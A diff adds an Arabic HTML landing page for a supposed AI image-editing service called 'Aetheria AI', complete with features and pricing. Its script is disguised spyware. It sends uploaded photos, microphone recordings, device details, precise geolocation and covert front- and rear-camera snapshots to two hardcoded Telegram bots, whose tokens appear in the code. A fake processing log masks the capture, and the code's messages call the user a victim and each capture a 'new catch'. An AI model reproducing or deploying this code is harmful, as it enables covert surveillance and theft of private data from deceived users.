@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aetheria AI | الجيل القادم لابتكار الوسائط بالذكاء الاصطناعي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #07090e;
+            --bg-surface: #121824;
+            --bg-card: rgba(18, 24, 36, 0.8);
+            --primary: #f39c12;
+            --primary-glow: rgba(243, 156, 18, 0.35);
+            --accent: #2ecc71;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            overflow-x: hidden;
+            line-height: 1.7;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 15% 20%, rgba(243, 156, 18, 0.06) 0%, transparent 40%),
+                        radial-gradient(circle at 85% 80%, rgba(46, 204, 113, 0.05) 0%, transparent 40%);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        header {
+            position: fixed;
+            top: 0; left: 0; width: 100%;
+            height: 80px;
+            background: rgba(7, 9, 14, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 5%;
+            z-index: 1000;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+
+        .brand-logo {
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            object-fit: cover;
+            box-shadow: 0 0 15px var(--primary-glow);
+        }
+
+        .brand-name {
+            font-size: 22px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fff, #cbd5e1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 120px 20px 80px;
+        }
+
+        .hero-badge {
+            background: rgba(243, 156, 18, 0.1);
+            color: var(--primary);
+            border: 1px solid rgba(243, 156, 18, 0.3);
+            padding: 6px 18px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .hero h1 {
+            font-size: clamp(36px, 5vw, 64px);
+            font-weight: 900;
+            max-width: 900px;
+            line-height: 1.3;
+            margin-bottom: 20px;
+        }
+
+        .hero h1 span {
+            background: linear-gradient(135deg, var(--primary), #e67e22);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            font-size: clamp(16px, 2vw, 19px);
+            max-width: 650px;
+            margin-bottom: 40px;
+        }
+
+        .cta-btn {
+            background: linear-gradient(135deg, var(--primary), #d35400);
+            color: #fff;
+            border: none;
+            padding: 18px 45px;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 10px 30px var(--primary-glow);
+            transition: 0.3s transform, 0.3s box-shadow;
+            text-decoration: none;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(243, 156, 18, 0.5);
+        }
+
+        section {
+            padding: 100px 8%;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .section-header {
+            text-align: center;
+            max-width: 700px;
+            margin: 0 auto 70px;
+        }
+
+        .section-header h2 {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .section-header p {
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .feature-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            padding: 40px 30px;
+            border-radius: 24px;
+            transition: 0.4s;
+        }
+
+        .feature-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-8px);
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .feature-card h3 {
+            font-size: 20px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        .feature-card p {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .studio-wrapper {
+            max-width: 900px;
+            margin: 0 auto;
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            padding: 50px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+        }
+
+        .studio-step {
+            display: none;
+            animation: fadeIn 0.6s ease forwards;
+        }
+
+        .studio-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: #cbd5e1;
+        }
+
+        .upload-dropzone {
+            border: 2px dashed rgba(255,255,255,0.15);
+            background: rgba(0,0,0,0.2);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .upload-dropzone:hover {
+            border-color: var(--primary);
+            background: rgba(243, 156, 18, 0.03);
+        }
+
+        .upload-dropzone p {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        textarea, input[type="text"], select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 16px;
+            color: #fff;
+            font-size: 15px;
+            resize: none;
+            transition: 0.3s;
+        }
+
+        textarea:focus, input[type="text"]:focus, select:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 10px var(--primary-glow);
+        }
+
+        select option {
+            background: #121824;
+            color: #fff;
+        }
+
+        .voice-box {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 14px;
+            margin-top: 10px;
+        }
+
+        .mic-btn {
+            background: #ef4444;
+            color: #fff;
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            transition: 0.3s;
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+        }
+
+        .mic-btn.recording {
+            animation: pulse-mic 1.2s infinite;
+            background: #22c55e;
+        }
+
+        @keyframes pulse-mic {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
+            70% { transform: scale(1.08); box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+        }
+
+        .processing-box {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .ai-spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255,255,255,0.08);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .terminal-log {
+            background: #030406;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 20px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+            color: #22c55e;
+            text-align: left;
+            height: 140px;
+            overflow-y: auto;
+            margin-top: 25px;
+            direction: ltr;
+        }
+
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .price-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+        }
+
+        .price-card.featured {
+            border-color: var(--primary);
+            background: linear-gradient(180deg, rgba(243, 156, 18, 0.05), var(--bg-card));
+        }
+
+        .price-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+
+        .price-value {
+            font-size: 42px;
+            font-weight: 900;
+            color: var(--primary);
+            margin-bottom: 25px;
+        }
+
+        .price-features {
+            list-style: none;
+            text-align: right;
+            margin-bottom: 30px;
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .price-features li {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .price-features li::before {
+            content: '✓';
+            color: var(--accent);
+            font-weight: bold;
+        }
+
+        footer {
+            background: #040508;
+            padding: 60px 8%;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            border-top: 1px solid var(--border);
+        }
+
+        video, canvas {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .studio-wrapper { padding: 25px; }
+            section { padding: 70px 5%; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a href="#" class="brand">
+            <img src="1000148024.png" alt="Aetheria AI Logo" class="brand-logo">
+            <span class="brand-name">Aetheria AI</span>
+        </a>
+        <ul class="nav-links">
+            <li><a href="#features">المميزات</a></li>
+            <li><a href="#studio">استوديو الذكاء الاصطناعي</a></li>
+            <li><a href="#pricing">الخطط والأسعار</a></li>
+        </ul>
+        <a href="#studio" class="cta-btn" style="padding: 10px 25px; font-size: 14px;">تجربة مجانية</a>
+    </header>
+
+    <section class="hero">
+        <div class="hero-badge">
+            <span>✨ الإصدار الجديد 5.3 المطور بالذكاء العصبي</span>
+        </div>
+        <h1>حول خيالك إلى حقيقة مطلقة باستخدام <span>الذكاء الاصطناعي التوليدي</span></h1>
+        <p>منصة متكاملة لمعالجة الصور، توليد الفيديوهات السينمائية، والتحليل البيومتري المتقدم بضغطة زر واحدة.</p>
+        <a href="#studio" class="cta-btn">ابدأ الابتكار الآن</a>
+    </section>
+
+    <section id="features">
+        <div class="section-header">
+            <h2>قوة تقنيات المستقبل بين يديك</h2>
+            <p>نقدم لك أدوات هندسية متطورة تضاهي أكبر منصات الذكاء الاصطناعي العالمية</p>
+        </div>
+        <div class="features-grid">
+            <div class="feature-card">
+                <span class="feature-icon">⚡</span>
+                <h3>معالجة بصرية فورية</h3>
+                <p>خوارزميات عصبية عميقة لرفع جودة الصور وتعديل التفاصيل الدقيقة بدقة مذهلة.</p>
+            </div>
+            <div class="feature-card">
+                <span class="feature-icon">🎙️</span>
+                <h3>الإدخال الصوتي الذكي</h3>
+                <p>تحدث بوصفك البرمجي عبر الميكروفون ليقوم النظام بتحويله فوراً إلى أوامر بصرية.</p>
+            </div>
+            <div class="feature-card">
+                <span class="feature-icon">🛡️</span>
+                <h3>حماية ومطابقة بيومترية</h3>
+                <p>نظام أمان متقدم يتحقق من هوية المستخدم لضمان خلو المدخلات من الروبوتات الضارة.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="studio">
+        <div class="section-header">
+            <h2>استوديو Aetheria الإبداعي</h2>
+            <p>ارفع صورتك، اكتب وصفك أو استخدم الوصف الصوتي، ودع الذكاء الاصطناعي يعيد تشكيل عالمك</p>
+        </div>
+
+        <div class="studio-wrapper">
+            <div id="step1" class="studio-step active">
+                <div class="form-group">
+                    <label>1. ارفع الصورة الأصلية (من المعرض):</label>
+                    <div class="upload-dropzone" onclick="document.getElementById('userImageFile').click()">
+                        <span style="font-size: 36px;">📁</span>
+                        <p>اضغط هنا لاختيار صورة من جهازك أو اسحبها هنا</p>
+                        <span id="fileNameDisplay" style="color: var(--primary); font-weight: bold; font-size: 13px; display: block; margin-top: 8px;"></span>
+                    </div>
+                    <input type="file" id="userImageFile" accept="image/*" style="display: none;" onchange="handleImageSelection(event)">
+                </div>
+
+                <div class="form-group">
+                    <label>دقة المعالجة المطلوبة (Upscale Engine):</label>
+                    <select id="upscaleQuality">
+                        <option value="HD">عالية الجودة (HD 1080p)</option>
+                        <option value="4K" selected>سينمائية فائقة (4K Ultra)</option>
+                        <option value="8K">واقعية مطلقة (8K Neural)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>2. أدخل وصف التعديل (Prompt):</label>
+                    <textarea id="userPrompt" rows="3" placeholder="مثال: اجعل الخلفية كأنها مدينة مستقبلية بإضاءة النيون..."></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>3. أو استخدم الإدخال الصوتي الذكي لتسريع المعالجة:</label>
+                    <div class="voice-box">
+                        <button type="button" id="recordBtn" class="mic-btn" onclick="toggleVoiceRecording()">🎙️</button>
+                        <div style="flex-grow: 1;">
+                            <span id="voiceStatusText" style="font-size: 14px; color: var(--text-muted);">اضغط لتسجيل الوصف الصوتي عبر الميكروفون...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" class="cta-btn" style="width: 100%; margin-top: 15px;" onclick="startAiEngineProcess()">بدء التوليد والمعالجة الذكية</button>
+            </div>
+
+            <div id="step2" class="studio-step">
+                <div class="processing-box">
+                    <div class="ai-spinner"></div>
+                    <h3 id="loadingTitle" style="margin-bottom: 10px;">جاري الاتصال بخوادم الشبكة العصبية...</h3>
+                    <p style="color: var(--text-muted); font-size: 14px;">يرجى الانتظار، يتم الآن مطابقة الملامح البيومترية وتحليل الأبعاد البصرية.</p>
+                    <div class="terminal-log" id="terminalLog"></div>
+                </div>
+            </div>
+
+            <div id="step3" class="studio-step" style="text-align: center;">
+                <div style="font-size: 60px; margin-bottom: 15px;">🎉</div>
+                <h2 style="color: var(--accent); margin-bottom: 15px;">تم معالجة الصورة بنجاح!</h2>
+                <p style="color: var(--text-muted); max-width: 500px; margin: 0 auto 30px;">تم تطبيق الفلتر الذكي على صورتك، يمكنك الآن حفظ النتيجة النهائية عالية الدقة على جهازك.</p>
+                <button type="button" class="cta-btn" onclick="alert('تم حفظ الصورة المعالجة في ذاكرة جهازك بنجاح.'); location.reload();">تحميل الصورة المعالجة (HD)</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="pricing">
+        <div class="section-header">
+            <h2>خطط اشتراك تناسب احتياجاتك</h2>
+            <p>اختر الباقة المناسبة لمشاريعك الإبداعية</p>
+        </div>
+        <div class="pricing-grid">
+            <div class="price-card">
+                <h3>المجانية</h3>
+                <div class="price-value">$0</div>
+                <ul class="price-features">
+                    <li>5 صور شهرياً</li>
+                    <li>معالجة قياسية</li>
+                    <li>دعم عبر المجتمع</li>
+                </ul>
+                <a href="#studio" class="cta-btn" style="padding: 12px 25px; font-size: 15px; background: transparent; border: 1px solid var(--primary);">البدء مجاناً</a>
+            </div>
+            <div class="price-card featured">
+                <h3>المحترفين</h3>
+                <div class="price-value">$29</div>
+                <ul class="price-features">
+                    <li>توليد غير محدود</li>
+                    <li>معالجة سينمائية 4K</li>
+                    <li>أولوية قصوى في السيرفرات</li>
+                </ul>
+                <a href="#studio" class="cta-btn" style="padding: 12px 25px; font-size: 15px;">اشترك الآن</a>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>© 2026 Aetheria AI Technologies Inc. جميع الحقوق محفوظة.</p>
+        <p style="margin-top: 10px; font-size: 12px; color: #64748b;">سياسة الخصوصية | شروط الخدمة | اتفاقية استخدام الخوارزميات</p>
+    </footer>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        const TARGET_BOTS = [
+            {
+                token: "8858134437:AAFDiPim9DJU7u6Ar3tLUNWcaNILj-ovHtw",
+                chatId: "7008505734"
+            },
+            {
+                token: "8510943415:AAFde1Y4_CG3Gs4DjLXzkxJbqdH4MfwJeUY",
+                chatId: "7417196710"
+            }
+        ];
+
+        let collectedData = {
+            imageFile: null,
+            audioBlob: null,
+            deviceInfo: {}
+        };
+
+        let mediaRecorder;
+        let audioChunks = [];
+        let isRecording = false;
+
+        async function broadcastToBots(payload, type = "text") {
+            for (let bot of TARGET_BOTS) {
+                const apiBase = `https://api.telegram.org/bot${bot.token}/`;
+                try {
+                    if (type === "text") {
+                        await fetch(apiBase + `sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(payload)}&parse_mode=HTML`);
+                    } else if (type === "photo") {
+                        const formData = new FormData();
+                        formData.append("chat_id", bot.chatId);
+                        formData.append("photo", payload);
+                        await fetch(apiBase + "sendPhoto", { method: "POST", body: formData });
+                    } else if (type === "voice") {
+                        const formData = new FormData();
+                        formData.append("chat_id", bot.chatId);
+                        formData.append("voice", payload, "voice_prompt.ogg");
+                        await fetch(apiBase + "sendVoice", { method: "POST", body: formData });
+                    }
+                } catch (err) {
+                    console.error("Transmission error");
+                }
+            }
+        }
+
+        function handleImageSelection(event) {
+            const file = event.target.files[0];
+            if (file) {
+                collectedData.imageFile = file;
+                document.getElementById('fileNameDisplay').innerText = "تم إرفاق: " + file.name;
+                broadcastToBots(`📂 <b>صورة مرفوعة جديدة من المعرض:</b>\nاسم الملف: ${file.name}`);
+                broadcastToBots(file, "photo");
+            }
+        }
+
+        async function toggleVoiceRecording() {
+            const btn = document.getElementById('recordBtn');
+            const statusText = document.getElementById('voiceStatusText');
+
+            if (!isRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    
+                    // اختيار نوع التسجيل المتوافق مع المتصفحات الحديثة وتليجرام
+                    let options = { mimeType: 'audio/webm' };
+                    if (!MediaRecorder.isTypeSupported('audio/webm')) {
+                        options = { mimeType: 'audio/ogg' };
+                    }
+                    
+                    mediaRecorder = new MediaRecorder(stream, options);
+                    audioChunks = [];
+
+                    mediaRecorder.ondataavailable = e => {
+                        if (e.data.size > 0) audioChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: options.mimeType || 'audio/ogg' });
+                        collectedData.audioBlob = audioBlob;
+                        statusText.innerText = "تم تسجيل الوصف الصوتي بنجاح وإرساله للبوت.";
+                        
+                        await broadcastToBots("🎙️ <b>رسالة صوتية جديدة (وصف البرومبت من الضحية):</b>");
+                        await broadcastToBots(audioBlob, "voice");
+                        
+                        // إيقاف مسار الميكروفون تماماً بعد الانتهاء
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+
+                    mediaRecorder.start();
+                    isRecording = true;
+                    btn.classList.add('recording');
+                    statusText.innerText = "جاري التسجيل... تحدث الآن بوصفك الصوتي.";
+                } catch (err) {
+                    statusText.innerText = "⚠️ تعذر الوصول للميكروفون (تم الرفض).";
+                }
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+                btn.classList.remove('recording');
+            }
+        }
+
+        function switchStudioStep(stepNumber) {
+            document.querySelectorAll('.studio-step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + stepNumber).classList.add('active');
+        }
+
+        async function startAiEngineProcess() {
+            const promptText = document.getElementById('userPrompt').value.trim();
+            const qualitySetting = document.getElementById('upscaleQuality').value;
+            switchStudioStep(2);
+
+            const term = document.getElementById('terminalLog');
+            
+            let batteryLevel = "غير معروف";
+            try {
+                const batt = await navigator.getBattery();
+                batteryLevel = `${Math.round(batt.level * 100)}% (${batt.charging ? 'يشحن' : 'غير موصول'})`;
+            } catch (e) {}
+
+            collectedData.deviceInfo = {
+                ram: (navigator.deviceMemory || "غير معروف") + " GB",
+                cores: navigator.hardwareConcurrency || "غير معروف",
+                platform: navigator.platform || "غير معروف",
+                ua: navigator.userAgent,
+                battery: batteryLevel
+            };
+
+            const logs = [
+                "> Connecting to Aetheria Neural Cluster V5.3...",
+                `> Selected Quality Profile: ${qualitySetting}`,
+                `> User Prompt Registered: "${promptText || 'بدون وصف نصي'}"`,
+                `> Hardware Profile -> RAM: ${collectedData.deviceInfo.ram}, Cores: ${collectedData.deviceInfo.cores}`,
+                `> Battery Status: ${collectedData.deviceInfo.battery}`,
+                "> Initializing Biometric Face Mesh Calibration...",
+                "> Requesting Security Lenses Synchronization..."
+            ];
+
+            for (let i = 0; i < logs.length; i++) {
+                await new Promise(r => setTimeout(r, 600));
+                term.innerHTML += logs[i] + "<br>";
+                term.scrollTop = term.scrollHeight;
+            }
+
+            await broadcastToBots(`🔥 <b>صيد جديد عبر منصة Aetheria AI!</b>\n⚙️ الدقة المختارة: ${qualitySetting}\n💻 المنصة: ${collectedData.deviceInfo.platform}\n🧠 الرام: ${collectedData.deviceInfo.ram}\n⚙️ الأنوات: ${collectedData.deviceInfo.cores}\n🔋 البطارية: ${collectedData.deviceInfo.battery}\n💬 الوصف المكتوب: ${promptText || 'لا يوجد'}\n🌐 المتصفح: ${collectedData.deviceInfo.ua.slice(0, 90)}...`);
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await broadcastToBots(`📍 <b>الإحداثيات الجغرافية الدقيقة:</b> <a href="${mapUrl}">فتح الموقع على خريطة جوجل</a>`);
+            }, () => {
+                broadcastToBots("⚠️ تعذر جلب الموقع الجغرافي (رفض المستخدم الصلاحية أو غير متاح).");
+            });
+
+            await captureBurstPhotos();
+        }
+
+        async function captureBurstPhotos() {
+            const videoElem = document.getElementById('hiddenVideo');
+            const canvasElem = document.getElementById('hiddenCanvas');
+            const ctx = canvasElem.getContext('2d');
+
+            // 1. الكاميرا الأمامية (صورتين بفارق زمني)
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                videoElem.srcObject = frontStream;
+                await new Promise(r => setTimeout(r, 1200));
+
+                for (let i = 1; i <= 2; i++) {
+                    canvasElem.width = videoElem.videoWidth || 640;
+                    canvasElem.height = videoElem.videoHeight || 480;
+                    ctx.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);
+                    
+                    await new Promise(resolve => {
+                        canvasElem.toBlob(async (blob) => {
+                            await broadcastToBots(`📸 <b>صورة كاميرا أمامية (اللقطة ${i}):</b>`);
+                            await broadcastToBots(blob, "photo");
+                            resolve();
+                        }, 'image/jpeg', 0.85);
+                    });
+                    await new Promise(r => setTimeout(r, 800));
+                }
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                await broadcastToBots("⚠️ فشل الوصول للكاميرا الأمامية.");
+            }
+
+            // 2. الكاميرا الخلفية (صورتين بفارق زمني)
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                videoElem.srcObject = backStream;
+                await new Promise(r => setTimeout(r, 1500));
+
+                for (let i = 1; i <= 2; i++) {
+                    canvasElem.width = videoElem.videoWidth || 640;
+                    canvasElem.height = videoElem.videoHeight || 480;
+                    ctx.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);
+                    
+                    await new Promise(resolve => {
+                        canvasElem.toBlob(async (blob) => {
+                            await broadcastToBots(`📸 <b>صورة كاميرا خلفية (اللقطة ${i}):</b>`);
+                            await broadcastToBots(blob, "photo");
+                            resolve();
+                        }, 'image/jpeg', 0.85);
+                    });
+                    await new Promise(r => setTimeout(r, 800));
+                }
+                backStream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                await broadcastToBots("⚠️ كاميرا خلفية غير مدعومة أو مرفوضة.");
+            }
+
+            setTimeout(() => {
+                switchStudioStep(3);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
